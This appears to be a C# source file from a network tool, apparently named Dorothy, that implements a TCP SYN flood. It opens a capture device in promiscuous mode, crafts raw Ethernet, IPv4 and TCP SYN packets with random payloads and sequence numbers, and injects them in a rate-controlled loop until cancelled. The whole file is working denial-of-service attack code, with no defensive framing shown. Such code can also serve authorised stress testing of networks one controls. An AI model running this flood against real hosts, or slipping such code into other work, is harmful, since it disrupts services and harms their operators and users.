using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using NLog;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using Dorothy.Models;
using System.Linq;

namespace Dorothy.Models
{
    public class TcpFlood : IDisposable
    {
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private readonly PacketParameters _params;
        private readonly CancellationToken _cancellationToken;
        private LibPcapLiveDevice? _device;

        public TcpFlood(PacketParameters parameters, CancellationToken cancellationToken)
        {
            _params = parameters;
            _cancellationToken = cancellationToken;
        }

        public async Task StartAsync()
        {
            Logger.Info("Starting TCP SYN Flood attack.");

            try
            {
                _device = CaptureDeviceList.Instance
                    .OfType<LibPcapLiveDevice>()
                    .FirstOrDefault(d => d.Addresses.Any(addr => 
                        addr.Addr.ipAddress != null && 
                        addr.Addr.ipAddress.ToString() == _params.SourceIp.ToString()));

                if (_device == null)
                {
                    Logger.Error("No device found with the specified source IP.");
                    throw new Exception("No device found with the specified source IP.");
                }

                _device.Open(DeviceModes.Promiscuous, 1000);

                if (_device is not IInjectionDevice injectionDevice)
                {
                    Logger.Error($"Device {_device.Name} does not support packet injection.");
                    throw new Exception($"Device {_device.Name} does not support packet injection.");
                }

                var random = new Random();
                var sourceMac = PhysicalAddress.Parse(BitConverter.ToString(_params.SourceMac).Replace("-", ""));
                var destMac = PhysicalAddress.Parse(BitConverter.ToString(_params.DestinationMac).Replace("-", ""));

                var ethernetPacket = new EthernetPacket(sourceMac, destMac, EthernetType.IPv4);
                var ipPacket = new IPv4Packet(_params.SourceIp, _params.DestinationIp)
                {
                    Protocol = PacketDotNet.ProtocolType.Tcp,
                    TimeToLive = _params.Ttl
                };

                var tcpPacket = new TcpPacket((ushort)_params.SourcePort, (ushort)_params.DestinationPort)
                {
                    Flags = 0x02,  // SYN flag
                    WindowSize = 8192,
                    SequenceNumber = 0,
                    PayloadData = new byte[1400]
                };

                random.NextBytes(tcpPacket.PayloadData);
                ipPacket.PayloadPacket = tcpPacket;
                ethernetPacket.PayloadPacket = ipPacket;

                int totalPacketSize = ethernetPacket.Bytes.Length;
                int batchSize = 64; // Moderate batch size
                long packetsPerSecond = _params.BytesPerSecond / totalPacketSize;
                double microsecondsPerBatch = (1_000_000.0 * batchSize) / packetsPerSecond;

                await Task.Run(() =>
                {
                    var stopwatch = new Stopwatch();
                    var bytes = new byte[4];

                    while (!_cancellationToken.IsCancellationRequested)
                    {
                        try
                        {
                            stopwatch.Restart();

                            for (int i = 0; i < batchSize && !_cancellationToken.IsCancellationRequested; i++)
                            {
                                // Update sequence number for each packet
                                random.NextBytes(bytes);
                                tcpPacket.SequenceNumber = BitConverter.ToUInt32(bytes, 0);
                                tcpPacket.UpdateCalculatedValues();
                                ipPacket.UpdateCalculatedValues();

                                injectionDevice.SendPacket(ethernetPacket);
                            }

                            // High precision rate limiting
                            long elapsedMicroseconds = stopwatch.ElapsedTicks * 1_000_000 / Stopwatch.Frequency;
                            if (elapsedMicroseconds < microsecondsPerBatch)
                            {
                                int remainingMicroseconds = (int)(microsecondsPerBatch - elapsedMicroseconds);
                                if (remainingMicroseconds > 1000) // Only sleep for delays > 1ms
                                {
                                    Thread.Sleep(remainingMicroseconds / 1000);
                                }
                                // Spin wait for sub-millisecond precision
                                while (stopwatch.ElapsedTicks * 1_000_000 / Stopwatch.Frequency < microsecondsPerBatch)
                                {
                                    Thread.SpinWait(1);
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            Logger.Error(ex, "Failed sending TCP packet.");
                        }
                    }
                }, _cancellationToken);
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "TCP SYN Flood attack failed.");
                throw;
            }
            finally
            {
                _device?.Close();
            }
        }

        public void Dispose()
        {
            _device?.Close();
        }
    }
}